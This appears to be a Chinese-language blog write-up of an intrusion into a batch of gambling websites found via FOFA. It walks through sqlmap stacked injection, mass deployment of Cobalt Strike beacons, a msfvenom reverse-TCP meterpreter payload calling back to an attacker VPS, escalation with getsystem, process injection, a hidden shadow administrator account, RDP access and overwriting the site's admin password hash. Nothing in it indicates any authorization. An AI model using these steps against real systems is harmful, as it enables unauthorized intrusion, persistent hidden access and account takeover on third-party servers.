## 信息搜集

首先当然是通过`fofa`进行bc网站的后台搜集（搜索语法大家自行探索），获得的qi牌bc站几乎都是一模一样，估计是分站。随便打开一个看看，是下图

![](../Images/4a3bfb37d3a97ebbd2e59b37da2f2813.png)

sqlmap跑一把，发现存在堆叠注入。由于都是分站，因此存在相同漏洞的应该不少。

![](../Images/3bebea5a872907521b357b9b722c586e.png)

## 上线cs

写个脚本，批量上线cs。可以看到有个上线就直接是SYSTEM权限，这就很无聊了。我们拿个普通权限的进行进一步渗透测试

![](../Images/6d21ca90af1ea95d693e944840442385.png)

![](../Images/8fde37bbcc86653264ab347b2778afe4.png)

![](../Images/fc5629fb5a2b29d8f0a5569d3f72e452.png)

首先我们要提权，至少也得有Administrator权限吧。

## 提权

### 方式一（漏洞利用）

cs中执行`run systeminfo`收集目标安装的补丁，使用在线提权辅助工具查看能够利用的漏洞。查找exp并利用即可。

### 方式二（msf辅助提权）

要想利用msf辅助提权，必须要反弹shell到msf

一方面可以利用cs在目标机上执行msf生成的木马上线msf。我这里是cs服务端和msf在同一vps上

```








msfvenom -p windows/meterpreter_reverse_tcp lhost=x.x.x.x lport=8888 -f exe > shell.exe
```

将`shell.exe`上传至目标并执行，即可看到msf已上线

![](../Images/45eef8ce0e87de080a8cb044cf7f2a63.png)

![](../Images/258261c32d61a9a0c9538ed5a62bd56d.png)

或者直接通过cs进行会话派生spawn

cs上创建监听器

![](../Images/50f07bebc49311ec21b669391931774f.png)

msf进行配置，注意这里两个payload要相互对应

```





use exploit/multi/handler
```

![](../Images/75629b8761d5cac9c84940ba555d9c79.png)

在msf中`getuid`查看到当前用户为`mssqlsserver`，利用msf自带的提权`getsystem`，居然直接就提权成功，拿到了system权限。

![](../Images/afdb69c93018cf0b52f529c816cfb85c.png)

然后再利用system权限执行cs生成的shell，上线之后就是system权限了

![](../Images/f2247e91b47c13cace0abb00b9066e0a.png)

当然我们获得system权限后可以注入进程，更安全一些

![](../Images/3d49dd4624b23bd69e0ac3e3b549e445.png)

![](../Images/24b380cfee5dffebda9cbf89fd884c82.png)

现在既然已经拿到了最高权限，那就可以为所欲为了。

## 后渗透

强烈建议创建一个影子管理员用户，请自行百度。

![](../Images/1fd1257f05d10acd93846e18bc0d3644.png)

### 开启RDP

![](../Images/d15bed09bca6530a424709a0ffb02780.png)

nmap扫一下发现3389端口未开

```








查看是否开启rdp
```

![](../Images/7e9ca8cfd11b804922c81a1cba8143bf.png)

![](../Images/3284e832231fd3784218b1e1bfa60bf2.png)

这个管理员看来还是有点安全意识的，吧RDP端口改成了39982

我们利用之前创建的影子用户进行RDP连接，直接就进到了桌面。可以看到这就是个“正儿八经“的bc网站(doge)

![](../Images/2b96e5f10f00852e7ada0943437bc027.png)

### 数据库

将mssql设置为windows登录验证，用影子用户连上他们的数据库看看

![](../Images/fc6545ee05da6cce04463e729e5a295b.png)

在一个数据表中找到后台登录的用户密码，很幸运密码直接就能用cmd5爆破出来。当然爆破不出来也没事，直接把我们自己的密码md5后直接修改数据表。

登进后台

整个渗透过程（尤其是提权过程）都异常的顺利，虽然通过辅助平台查询后发现有多个漏洞可以利用，但没想到msf的getsystem直接就拿下了最高权限。
